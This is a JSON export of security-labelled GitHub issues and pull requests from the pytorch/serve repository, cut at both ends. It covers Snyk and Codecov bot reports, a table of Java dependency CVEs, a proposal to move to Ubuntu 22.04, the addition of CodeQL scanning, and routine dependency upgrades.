![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Resource Exhaustion <br/>[SNYK-UBUNTU2210-SYSTEMD-3148007](https://snyk.io/vuln/SNYK-UBUNTU2210-SYSTEMD-3148007)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | CVE-2022-4415 <br/>[SNYK-UBUNTU2210-SYSTEMD-3180315](https://snyk.io/vuln/SNYK-UBUNTU2210-SYSTEMD-3180315)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Out-of-bounds Read <br/>[SNYK-UBUNTU2210-TAR-3261142](https://snyk.io/vuln/SNYK-UBUNTU2210-TAR-3261142)   | No Known Exploit   |\n\n\n\n---\n\n**Note:** _You are seeing this because you or someone else with access to this repository has authorized Snyk to open fix PRs._\n\nFor more information: <img src=\"https://api.segment.io/v1/pixel/track?data=eyJ3cml0ZUtleSI6InJyWmxZcEdHY2RyTHZsb0lYd0dUcVg4WkFRTnNCOUEwIiwiYW5vbnltb3VzSWQiOiIyNDgwMjEzNS1lNDVmLTQ3MjQtYjk2Ny0yMzZlODA5MjZkYjEiLCJldmVudCI6IlBSIHZpZXdlZCIsInByb3BlcnRpZXMiOnsicHJJZCI6IjI0ODAyMTM1LWU0NWYtNDcyNC1iOTY3LTIzNmU4MDkyNmRiMSJ9fQ==\" width=\"0\" height=\"0\"/>\n🧐 [View latest project report](https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr)\n\n🛠 [Adjust project settings](https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source&#x3D;github&amp;utm_medium&#x3D;referral&amp;page&#x3D;fix-pr/settings)\n\n[//]: # 'snyk:metadata:{\"prId\":\"24802135-e45f-4724-b967-236e80926db1\",\"prPublicId\":\"24802135-e45f-4724-b967-236e80926db1\",\"dependencies\":[{\"name\":\"ubuntu\",\"from\":\"rolling\",\"to\":\"22.10\"}],\"packageManager\":\"dockerfile\",\"projectPublicId\":\"ad8cdeca-1810-450c-b930-16863a307899\",\"projectUrl\":\"https://app.snyk.io/org/msaroufim/project/ad8cdeca-1810-450c-b930-16863a307899?utm_source=github&utm_medium=referral&page=fix-pr\",\"type\":\"auto\",\"patch\":[],\"vulns\":[\"SNYK-UBUNTU2210-TAR-3261142\",\"SNYK-UBUNTU2210-GNUTLS28-3319585\",\"SNYK-UBUNTU2210-SYSTEMD-3148007\",\"SNYK-UBUNTU2210-SYSTEMD-3180315\"],\"upgrade\":[\"SNYK-UBUNTU2210-GNUTLS28-3319585\",\"SNYK-UBUNTU2210-SYSTEMD-3148007\",\"SNYK-UBUNTU2210-SYSTEMD-3148007\",\"SNYK-UBUNTU2210-SYSTEMD-3180315\",\"SNYK-UBUNTU2210-TAR-3261142\"],\"isBreakingChange\":false,\"env\":\"prod\",\"prType\":\"fix\",\"templateVariants\":[\"updated-fix-title\"],\"priorityScoreList\":[null,null,null,null],\"remediationStrategy\":\"vuln\"}'\n\n---\n\n**Learn how to fix vulnerabilities with free interactive lessons:**\n\n 🦉 [Resource Exhaustion](https://learn.snyk.io/lessons/redos/javascript/?loc&#x3D;fix-pr)\n",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2239?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2239](https://app.codecov.io/gh/pytorch/serve/pull/2239?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (37d686d) into [master](https://app.codecov.io/gh/pytorch/serve/commit/754c2f9a550ff57790e586c199dc8b7a842af159?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (754c2f9) will **increase** coverage by `0.08%`.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 37d686d differs from pull request most recent head 9243cf4. Consider uploading reports for the commit 9243cf4 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2239      +/-   ##\n==========================================\n+ Coverage   71.81%   71.89%   +0.08%     \n==========================================\n  Files          78       78              \n  Lines        3654     3654              \n  Branches       58       58              \n==========================================\n+ Hits         2624     2627       +3     \n+ Misses       1026     1023       -3     \n  Partials        4        4              \n```\n\n\n[see 1 file with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2239/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-18T19:33:36Z",
                        "url": "https://github.com/pytorch/serve/pull/2239#issuecomment-1513693165"
                    },
                    {
                        "body": "This doesnt feel that important",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-07-21T21:59:13Z",
                        "url": "https://github.com/pytorch/serve/pull/2239#issuecomment-1646277295"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2239",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2178",
                "title": "Java Security Vulnerabilities",
                "labels": [
                    "security"
                ],
                "user": "Nickleha",
                "issue_author_association": "NONE",
                "number": 2178,
                "id": 1622505798,
                "state": "closed",
                "project_created_at": "2023-03-14T00:20:14Z",
                "closed_at": "2023-10-28T19:40:13Z",
                "body": "### 🐛 Describe the bug\n\nThere are a few outdated Java packages throughout the repo that have open high severity CVE's. There's a large number of mediums and below, but since pretty much nobody blocks deployment for those I'm not too concerned. \r\n\r\n\r\n\r\nNetty currently defined in frontend gradle.properties would need to be incremented to 4.1.86.Final \r\n\r\nThe jackson databind vulnerabilities are due to dependencies from the core log4j package (also defined in the frontend gradle.properties). 2.20.0 is the first update that closes all of those by incrementing the databind version up to 2.14.\r\n\r\nTestng also defined in frontend gradle to version 7.1.0 (though prisma is picking up a version at 6.3.0?), but all versions < 7.7.0 have the same vulnerability for testngXmlExistsInJar.\r\n\r\nI'm actually having trouble pinning down how com.amazonaws_aws-java-sdk-s3 gets installed at version 1.11.948. My best guess is that it's installed as part of the DBEEndpoint gradle build, where com.amazonaws:DynamoDBLocal:1.13.2 requires com.amazonaws:aws-java-sdk-dynamodb:1.11.780 which requires the s3 package in question. That version required is [1.11.780](https://mvnrepository.com/artifact/com.amazonaws/aws-java-sdk-s3/1.11.780) while 1.11.948 is what's ultimately in the image. \r\n\r\nThe two packages with mismatches between where I can find versions and what I see in the final image make me think that I don't fully understand all the ways they're installed and used though. \r\n\n\n### Error logs\n\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n|      CVE       | SEVERITY | CVSS |                   PACKAGE                   |   VERSION    |      STATUS       |  PUBLISHED  | DISCOVERED | GRACE DAYS |                    DESCRIPTION                     |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-42004 | high     | 7.50 | com.fasterxml.jackson.core_jackson-databind | 2.13.3       | fixed in 2.13.4   | > 5 months  | < 1 hour   | -117       | In FasterXML jackson-databind before 2.13.4,       |\r\n|                |          |      |                                             |              | > 5 months ago    |             |            |            | resource exhaustion can occur because of a lack of |\r\n|                |          |      |                                             |              |                   |             |            |            | a check in BeanDeserializer._deserializeFromArray  |\r\n|                |          |      |                                             |              |                   |             |            |            | to p...                                            |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-42003 | high     | 7.50 | com.fasterxml.jackson.core_jackson-databind | 2.13.3       | fixed in 2.14.0   | > 5 months  | < 1 hour   | -117       | In FasterXML jackson-databind before 2.14.0-rc1,   |\r\n|                |          |      |                                             |              | > 5 months ago    |             |            |            | resource exhaustion can occur because of a lack of |\r\n|                |          |      |                                             |              |                   |             |            |            | a check in primitive value deserializers to avoid  |\r\n|                |          |      |                                             |              |                   |             |            |            | ...                                                |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-41881 | high     | 7.50 | io.netty_netty-all                          | 4.1.53.Final | fixed in 4.1.86   | > 3 months  | < 1 hour   | -39        | Netty project is an event-driven asynchronous      |\r\n|                |          |      |                                             |              | 83 days ago       |             |            |            | network application framework. In versions prior   |\r\n|                |          |      |                                             |              |                   |             |            |            | to 4.1.86.Final, a StackOverflowError can be       |\r\n|                |          |      |                                             |              |                   |             |            |            | raised whe...                                      |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2021-37137 | high     | 7.50 | io.netty_netty-all                          | 4.1.53.Final | fixed in 4.1.68   | > 1 years   | < 1 hour   | -465       | The Snappy frame decoder function doesn\\t         |\r\n|                |          |      |                                             |              | > 1 years ago     |             |            |            | restrict the chunk length which may lead to        |\r\n|                |          |      |                                             |              |                   |             |            |            | excessive memory usage. Beside this it also may    |\r\n|                |          |      |                                             |              |                   |             |            |            | buffer reserved...                                 |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2021-37136 | high     | 7.50 | io.netty_netty-all                          | 4.1.53.Final | fixed in 4.1.68   | > 1 years   | < 1 hour   | -465       | The Bzip2 decompression decoder function           |\r\n|                |          |      |                                             |              | > 1 years ago     |             |            |            | doesn\\t allow setting size restrictions on        |\r\n|                |          |      |                                             |              |                   |             |            |            | the decompressed output data (which affects the    |\r\n|                |          |      |                                             |              |                   |             |            |            | allocation size u...                               |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-4065  | high     | 7.00 | org.testng_testng                           | 6.3.1        | fixed in 7.7.0    | > 3 months  | < 1 hour   | -9         | A vulnerability was found in cbeust testng. It     |\r\n|                |          |      |                                             |              | 53 days ago       |             |            |            | has been declared as critical. Affected by this    |\r\n|                |          |      |                                             |              |                   |             |            |            | vulnerability is the function testngXmlExistsInJar |\r\n|                |          |      |                                             |              |                   |             |            |            | of t...                                            |\r\n+----------------+----------+------+---------------------------------------------+--------------+-------------------+-------------+------------+------------+----------------------------------------------------+\r\n| CVE-2022-31159 | high     | 7.00 | com.amazonaws_aws-java-sdk-s3               | 1.11.948     | fixed in 1.12.261 | > 8 months  | < 1 hour   | -196       | The AWS SDK for Java enables Java developers       |\r\n|                |          |      |                                             |              | > 8 months ago    |             |            |            | to work with Amazon Web Services. A                |\r\n|                |          |      |                                             |              |                   |             |            |            | partial-path traversal issue exists within the     |\r\n|                |          |      |                                             |              |                   |             |            |            | `downloadDirectory` me...       \n\n### Installation instructions\n\nFailing packages present when scanning torchserve:latest and torchserve-nightly:latest-cpu with prisma. I am not sure how to check full snyk results. \n\n### Model Packaing\n\nn/a\n\n### config.properties\n\nn/a\n\n### Versions\n\nall current versions from base image for 0.7.1 release with no modifications\n\n### Repro instructions\n\nn/a\n\n### Possible Solution\n\nIn frontend gradle.properties increment  netty_version to 4.1.86.Final and slf4j_log4j_version to 2.20.0.\r\n\r\nThe other vulnerabilities i'm not positive on how to manage the versions. \r\nFor org.testng_testng, there's already an older version that exists somewhere in the image, so I think there's a way installs are managed that I don't understand.\r\nFor com.amazonaws_aws-java-sdk-s3, does it makes sense that the package i'm finding is ultimately due to the DDBEndPoint installation? \r\n\r\nI'm not sure what makes it into the dockerhub images versus what is only built for dev purposes for for running the regression suite, which means I may misunderstand the best way to solve these. \r\n\r\n",
                "comments": [
                    {
                        "body": "Absolutely, this version of log4j and a few other packages is worrisome. Would love if something could be done about it.",
                        "user": "0-zen",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-16T21:52:47Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1472797446"
                    },
                    {
                        "body": "In between other work tasks I'm setting up a way to build and test against our implementation of prisma. Once I have an easy way to fiddle with versions, test build still works correctly, and make sure they resolve all the java package related vulnerabilities, I can make a PR off a bug fix branch with the version incrs.",
                        "user": "Nickleha",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-16T22:38:45Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1472855459"
                    },
                    {
                        "body": "@msaroufim Earlier info I dropped in the bug report isn't right. The only problem package of the ones I listed that is actually defined in gradle.properties is netty, the others are due to gradle plugins. Just an FYI that any solution has to have both changed, but I also wanted to double check if upgrading our gradle version throws any sanity check red flags for anybody (build --scan already shows which possible deprecated functions I'd need to change with it).",
                        "user": "Nickleha",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-03-21T19:25:23Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1478463083"
                    },
                    {
                        "body": "We are now updating dependencies on a monthly basis with dependabot",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-28T19:40:13Z",
                        "url": "https://github.com/pytorch/serve/issues/2178#issuecomment-1783906237"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2150",
                "title": "Upgrade to ubuntu22.04 to fix security issues.",
                "labels": [
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2150,
                "id": 1593683987,
                "state": "closed",
                "project_created_at": "2023-02-21T15:31:35Z",
                "closed_at": "2023-06-26T12:09:29Z",
                "body": "There're still many security issues on ubuntu20.04, in order to improve the security, need upgrade to ubuntu 22.04.\r\n\r\nubuntu22.04 is only available for cu117 as nvidia/cuda only provide ubuntu22.04 for cu117 or above.\r\n\r\nbelow is an example of security issues.\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/220387875-1a5dcd32-7401-4ab9-ac3a-a66ffbac4217.png)\r\n\r\n\r\nFixes #(issue)\r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [ ] Bug fix (non-breaking change which fixes an issue)\r\n- [ ] New feature (non-breaking change which adds functionality)\r\n- [ ] This change requires a documentation update\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [ ] regression testing\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/220388150-eb01a77c-1c87-4c83-b5f4-bb03d88ff7a6.png)\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/220388213-117f09b1-aec3-44dc-b98c-521dda8cb9b2.png)\r\n\r\n\r\n## Checklist:\r\n\r\n- [ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2150?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2150](https://codecov.io/gh/pytorch/serve/pull/2150?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (b931925) into [master](https://codecov.io/gh/pytorch/serve/commit/c417b4a03ba9be315090464de76893304361f9e1?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c417b4a) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head b931925 differs from pull request most recent head 0dc29d9. Consider uploading reports for the commit 0dc29d9 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2150   +/-   ##\n=======================================\n  Coverage   53.36%   53.36%           \n=======================================\n  Files          71       71           \n  Lines        3225     3225           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1504     1504           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-02-21T16:12:37Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1438745541"
                    },
                    {
                        "body": "We encountered a lot of flakiness on our ubuntu CI when we moved from 18.04 to 22.04 or 20.04. This is an issue because I'd rather we use the same Ubuntu version everywhere so both for the docker files and anything under `.github/workflows` otherwise there's always a chance that a small dependency change breaks everything.\r\n\r\nAlso I'm still not sure what our policy should be for medium or low impact security issues, my worry is we'd spend too much time upgrading dependencies as opposed to focusing on the bigger security issues",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-02-21T17:42:55Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1438870606"
                    },
                    {
                        "body": "we have very strict security policy, medium issues should be fixed as far as possible.",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-02-22T03:15:36Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1439379519"
                    },
                    {
                        "body": "Hi @jack-gits do you mind emailing me? It's my firstnamelastname@meta.com - since security is obviously important to you, I'd rather we discuss things in more depth there",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-02-22T03:20:05Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1439382680"
                    },
                    {
                        "body": "> \r\n\r\nhave you got my email by jackxu081@gmail.com?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-03-04T05:01:53Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1454440663"
                    },
                    {
                        "body": "I believe I missed your original, email just emailed you now",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-03-04T22:18:42Z",
                        "url": "https://github.com/pytorch/serve/pull/2150#issuecomment-1454905045"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2150",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2149",
                "title": "Add Github Code Scanning codeql.yml",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2149,
                "id": 1592303241,
                "state": "closed",
                "project_created_at": "2023-02-20T18:35:20Z",
                "closed_at": "2023-02-21T17:29:59Z",
                "body": "## Description\r\n\r\nThis PR adds support for code scanning which detects a large suite of common vulnerabilities like code injection, directory traversal, bad crypto algorithms\r\n\r\nSo now our security process includes\r\n1. Dependency analysis with dependabot\r\n2. Code scanning (this PR)\r\n3. Docker scanning (Snyk, already added in 0.7.1)\r\n\r\nMight also be useful to do\r\n1. Penetration testing on a deployed instance - maybe @agunapal is interested in this\r\n2. An Audit - I'll look into this\r\n\r\nThe security issues will show up in https://github.com/pytorch/serve/security/code-scanning after this is merged\r\n\r\n## Type of change\r\n\r\n\r\n- [x] New feature (non-breaking change which adds functionality)\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [x] Test A\r\n\r\nScroll down to CI, there should be 2 new jobs for code scanning, one for python and one for java\r\n\r\nWhen both those jobs get completed a report gets created and it accurately shows some existing vulnerabilities we need to be fixing https://github.com/pytorch/serve/pull/2149/checks?check_run_id=11473788403\r\n\r\n\r\n## Checklist:\r\n\r\n- [x] Did you have fun?\r\n- [x] Have you added tests that prove your fix is effective or that this feature works?\r\n- [x] Has code been commented, particularly in hard-to-understand areas?\r\n\r\n\r\n",
                "comments": [
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2149?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2149](https://codecov.io/gh/pytorch/serve/pull/2149?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (330273f) into [master](https://codecov.io/gh/pytorch/serve/commit/c417b4a03ba9be315090464de76893304361f9e1?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c417b4a) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 330273f differs from pull request most recent head aa02933. Consider uploading reports for the commit aa02933 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2149   +/-   ##\n=======================================\n  Coverage   53.36%   53.36%           \n=======================================\n  Files          71       71           \n  Lines        3225     3225           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1504     1504           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-02-20T18:56:43Z",
                        "url": "https://github.com/pytorch/serve/pull/2149#issuecomment-1437431296"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2149",
                    "merged_at": "2023-02-21T17:29:59Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2081",
                "title": "Update to safe snakeyaml,  grpc and gradle",
                "labels": [
                    "security"
                ],
                "user": "jack-gits",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2081,
                "id": 1538260965,
                "state": "closed",
                "project_created_at": "2023-01-18T16:00:19Z",
                "closed_at": "2023-01-18T21:26:11Z",
                "body": "## Description\r\n\r\nfix some security issues found in 0.7.0 as followings:\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/213219859-04e44196-50e4-4587-bf97-b8528040f519.png)\r\n\r\n\r\nFixes #([issue](https://github.com/pytorch/serve/issues/2042))\r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [ ] Bug fix (non-breaking change which fixes an issue)\r\n\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n- [ ] Regression testing\r\n![image](https://user-images.githubusercontent.com/30545972/213222828-1d34ed45-6e8c-4536-be07-3841725a7d84.png)\r\n\r\n![image](https://user-images.githubusercontent.com/30545972/213223200-55af5604-91c2-49ea-a259-226216b73b41.png)\r\n\r\n\r\n\r\n## Checklist:\r\n\r\n- [ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "@jack-gits I just changed the title, if you make further changes please update the title correspondingly. It helps make sure we can credit you in the release notes",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-18T17:40:56Z",
                        "url": "https://github.com/pytorch/serve/pull/2081#issuecomment-1387465600"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2081?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2081](https://codecov.io/gh/pytorch/serve/pull/2081?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c96d783) into [master](https://codecov.io/gh/pytorch/serve/commit/79241145ff9e14a66d1260bdf284d2348db5da12?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (7924114) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2081   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-18T18:09:29Z",
                        "url": "https://github.com/pytorch/serve/pull/2081#issuecomment-1387498778"
                    },
                    {
                        "body": "when will it be released?",
                        "user": "jack-gits",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-02-06T02:41:41Z",
                        "url": "https://github.com/pytorch/serve/pull/2081#issuecomment-1418421223"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2081",
                    "merged_at": "2023-01-18T21:26:11Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2078",
                "title": "Upgrade to  PyTorch 1.13.1",
                "labels": [
                    "security"
                ],
                "user": "agunapal",
                "issue_author_association": "COLLABORATOR",
                "number": 2078,
                "id": 1532736196,
                "state": "closed",
                "project_created_at": "2023-01-13T18:25:36Z",
                "closed_at": "2023-01-17T17:12:06Z",
                "body": "## Description\r\n\r\nUpgrade PyTorch to version 1.13.1\r\n\r\nFixes #(issue)\r\n\r\n## Type of change\r\n\r\nPlease delete options that are not relevant.\r\n\r\n- [ ] Bug fix (non-breaking change which fixes an issue)\r\n- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)\r\n- [x] New feature (non-breaking change which adds functionality)\r\n- [ ] This change requires a documentation update\r\n\r\n## Feature/Issue validation/testing\r\n\r\nPlease describe the Unit or Integration tests that you ran to verify your changes and relevant result summary. Provide instructions so it can be reproduced.\r\nPlease also list any relevant details for your test configuration.\r\n\r\n[1_regression-gpu (cu116).txt](https://github.com/pytorch/serve/files/10414380/1_regression-gpu.cu116.txt)\r\n[2_regression-gpu (cu117).txt](https://github.com/pytorch/serve/files/10414382/2_regression-gpu.cu117.txt)\r\n[1_regression-cpu (ubuntu-20.04).txt](https://github.com/pytorch/serve/files/10414383/1_regression-cpu.ubuntu-20.04.txt)\r\n[2_regression-cpu (macOS-latest).txt](https://github.com/pytorch/serve/files/10414384/2_regression-cpu.macOS-latest.txt)\r\n\r\n\r\n\r\n\r\n## Checklist:\r\n\r\n- [ ] Did you have fun?\r\n- [ ] Have you added tests that prove your fix is effective or that this feature works?\r\n- [ ] Has code been commented, particularly in hard-to-understand areas?\r\n- [ ] Have you made corresponding changes to the documentation?",
                "comments": [
                    {
                        "body": "Interesting that this all crashed here https://github.com/pytorch/serve/pull/2074 but CI here seems to have passed",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-01-13T19:01:01Z",
                        "url": "https://github.com/pytorch/serve/pull/2078#issuecomment-1382256190"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/pytorch/serve/pull/2078?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2078](https://codecov.io/gh/pytorch/serve/pull/2078?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (3be380c) into [master](https://codecov.io/gh/pytorch/serve/commit/8c11091ebf616e00e23657682f47c5233b246778?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (8c11091) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2078   +/-   ##\n=======================================\n  Coverage   53.38%   53.38%           \n=======================================\n  Files          71       71           \n  Lines        3224     3224           \n  Branches       56       56           \n=======================================\n  Hits         1721     1721           \n  Misses       1503     1503           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-13T19:05:51Z",
                        "url": "https://github.com/pytorch/serve/pull/2078#issuecomment-1382261522"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2078",
                    "merged_at": "2023-01-17T17:12:06Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2069",
                "title": "[Snyk] Upgrade com.google.code.gson:gson from 2.9.0 to 2.10",
                "labels": [
                    "security"
                ],
                "user": "snyk-bot",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2069,
                "id": 1529873583,
                "state": "closed",
                "project_created_at": "2023-01-11T23:40:12Z",
                "closed_at": "2023-01-13T00:31:10Z",
